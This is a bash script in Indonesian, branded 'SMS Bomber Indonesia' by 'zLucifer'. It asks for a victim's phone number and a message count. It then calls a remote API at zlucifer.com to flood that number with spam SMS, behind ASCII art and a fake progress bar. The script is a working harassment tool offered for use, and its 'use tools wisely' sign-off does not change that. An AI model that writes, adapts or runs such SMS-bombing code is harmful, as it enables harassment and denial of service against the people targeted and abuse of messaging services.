#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                       _            _  __                              ////
#////                      | |          (_)/ _|                             ////
#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
#////                   / /| | |_| | (__| | ||  __/ |                       ////
#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
sleep 0.03
echo "      _.-^^---....,,-- "
sleep 0.03
echo "  _--                  --_ "
sleep 0.03
echo " <                        >) "
sleep 0.03
echo " |                         | "
sleep 0.03
echo "  \._                   _./ "
sleep 0.03
echo "     '''--. . , ; .--'''    " 
sleep 0.03
echo "           | |   |           "
sleep 0.03
echo "        .-=||  | |=-.    "
sleep 0.03
echo "        '-=#$%&%$#=-'    "
sleep 0.03
echo "           | ;  :|      "
sleep 0.03
echo "  _____.,-#%&$@%#&#~,._____ "
sleep 0.03
echo "============================="
sleep 2
echo "==   SMS Bomber Indonesia  =="
sleep 0.7
echo "============================="
echo Selamat datang $nick ":)"
get_url=$(curl -s http://zlucifer.com/api/sms.php)
cek='curl -s '$get_url # check status
response=`curl -s -o /dev/null -w "%{http_code}" $cek`
if [[ $response = *sleeping* ]]; then
    echo
    echo "Website Offline/Restart untuk sementara"
else
    echo
    echo "Silahkan masukan nomor telp target"
    echo contoh 0812345678
    read target # masukin no telp
    echo
    echo "Berapa sms yang mau dikirim?"
    read paket
    echo
    echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
    echo y/n?
    read confirm
    echo
    if [ $confirm = "y" ]; then
        echo Melakukan spam SMS ke nomor $target
        i=0
        max=100
        while [ $i -le $max ]; do
        echo -ne "\nSpamming percentage : $i% "
        sleep 0.03
        if [ $i -eq 100 ]; then
            echo -ne " [complete!]\n"
            echo "Jangan close aplikasi sebelum spam selesai"            
            echo "========================================"
            target_do=$get_url'/sms.php?nomor='$target'&paket='$paket


            CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
            echo " Gunakan tools dengan bijak"
            echo
            echo " Love u always "
            echo " -zLucifer"
            echo "======================================="
            fi
            let i++
            done
    else
        echo "Kesalahan"
    fi
fi
